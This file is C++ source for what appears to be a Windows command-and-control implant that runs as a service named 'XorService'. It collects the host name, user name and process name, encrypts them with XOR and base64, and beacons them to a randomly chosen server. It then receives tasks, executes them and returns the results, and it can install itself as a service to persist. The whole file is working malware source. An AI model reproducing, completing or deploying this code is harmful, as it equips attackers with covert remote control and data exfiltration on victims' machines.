#include <windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <sstream>
#include <random>
#include <ctime>
#include "config.h"
#include "system_utils.h"
#include "base64.h"
#include "crypt.h"
#include "http_client.h"
#include "task.h"

SERVICE_STATUS gSvcStatus;
SERVICE_STATUS_HANDLE gSvcStatusHandle;
HANDLE ghSvcStopEvent = INVALID_HANDLE_VALUE;
std::thread gAgentThread;
bool gStopService = false;

std::string beakon(const std::string& data_res) {
    std::string agent_id = generate_agent_id();
    std::string hostname = get_hostname();
    std::string username = get_username();
    std::string process_name = get_process_name();
    std::ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"hostname\":\"" << hostname << "\",";
    ss << "\"username\":\"" << username << "\",";
    ss << "\"process_name\":\"" << process_name << "\",";
    ss << "\"results\":\"" << data_res << "\"";
    ss << "}";
    std::string result_json = ss.str();
    std::string encoded = xor_data(result_json, XOR_KEY);
    std::string b64_encoded = base64_encode(encoded);
    constexpr int XOR_SERVERS_COUNT = sizeof(XOR_SERVERS) / sizeof(XOR_SERVERS[0]);
    std::mt19937 rng((unsigned int)std::time(nullptr));
    std::uniform_int_distribution<int> distrib(0, XOR_SERVERS_COUNT - 1);
    int random_index = distrib(rng);
    std::string res = http_post(XOR_SERVERS[random_index], XOR_PORT, RESULTS_PATH, USER_AGENT, HEADER, b64_encoded);
    return res;
}

void agent_run() {
    std::setvbuf(stdout, NULL, _IONBF, 0);
    std::string register_call = beakon("");
    std::string result;
    while (!gStopService) {
        std::this_thread::sleep_for(std::chrono::seconds(BEACON_INTERVAL));
        if (gStopService) break;
        std::string beakon_call = beakon(result);
        result = parse_task(beakon_call);
    }
}

void SvcInstall(void);
void SvcUninstall(void);
void WINAPI SvcCtrlHandler(DWORD);
void WINAPI SvcMain(DWORD, LPTSTR*);
void ReportSvcStatus(DWORD, DWORD, DWORD);
void SvcInit(DWORD, LPTSTR*);

void SvcInstall(void) {
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    TCHAR szPath[MAX_PATH];
    if (!GetModuleFileName(NULL, szPath, MAX_PATH)) {
        return;
    }
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (NULL == schSCManager) {
        return;
    }
    schService = CreateService(
        schSCManager,
        L"XorService",
        L"Xor Service",
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        szPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);
    if (schService == NULL) {
        CloseServiceHandle(schSCManager);
        return;
    }
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

void SvcUninstall(void) {
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (NULL == schSCManager) {
        return;
    }
    schService = OpenService(schSCManager, L"XorService", DELETE);
    if (schService == NULL) {
        CloseServiceHandle(schSCManager);
        return;
    }
    DeleteService(schService);
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

void WINAPI SvcCtrlHandler(DWORD dwCtrl) {
    switch (dwCtrl) {
    case SERVICE_CONTROL_STOP:
        ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
        gStopService = true;
        SetEvent(ghSvcStopEvent);
        ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    default:
        break;
    }
}

void WINAPI SvcMain(DWORD dwArgc, LPTSTR* lpszArgv) {
    ghSvcStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (ghSvcStopEvent == NULL) {
        return;
    }
    gSvcStatusHandle = RegisterServiceCtrlHandler(L"XorService", SvcCtrlHandler);
    if (!gSvcStatusHandle) {
        CloseHandle(ghSvcStopEvent);
        return;
    }
    gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    gSvcStatus.dwControlsAccepted = 0;
    gSvcStatus.dwCurrentState = SERVICE_START_PENDING;
    gSvcStatus.dwWin32ExitCode = 0;
    gSvcStatus.dwServiceSpecificExitCode = 0;
    gSvcStatus.dwCheckPoint = 0;
    gSvcStatus.dwWaitHint = 0;
    ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
    SvcInit(dwArgc, lpszArgv);
}

void ReportSvcStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
    static DWORD dwCheckPoint = 1;
    gSvcStatus.dwCurrentState = dwCurrentState;
    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
    gSvcStatus.dwWaitHint = dwWaitHint;
    if (dwCurrentState == SERVICE_START_PENDING)
        gSvcStatus.dwControlsAccepted = 0;
    else
        gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED))
        gSvcStatus.dwCheckPoint = 0;
    else
        gSvcStatus.dwCheckPoint = dwCheckPoint++;
    SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
}

void SvcInit(DWORD dwArgc, LPTSTR* lpszArgv) {
    ghSvcStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (ghSvcStopEvent == NULL) {
        ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
        return;
    }
    ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
    gAgentThread = std::thread(agent_run);
    while (1) {
        WaitForSingleObject(ghSvcStopEvent, INFINITE);
        ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
        return;
    }
}

int main(int argc, char* argv[]) {
    if (argc > 1) {
        if (strcmp(argv[1], "install") == 0) {
            SvcInstall();
            return 0;
        }
        else if (strcmp(argv[1], "uninstall") == 0) {
            SvcUninstall();
            return 0;
        }
    }
    wchar_t buffer[24];
    wcscpy_s(buffer, 24, L"XorService");
    LPWSTR ptr = buffer;
    SERVICE_TABLE_ENTRY DispatchTable[] = {
        {ptr, (LPSERVICE_MAIN_FUNCTION)SvcMain},
        {NULL, NULL}
    };
    if (!StartServiceCtrlDispatcher(DispatchTable)) {
        return 1;
    }
    return 0;
}
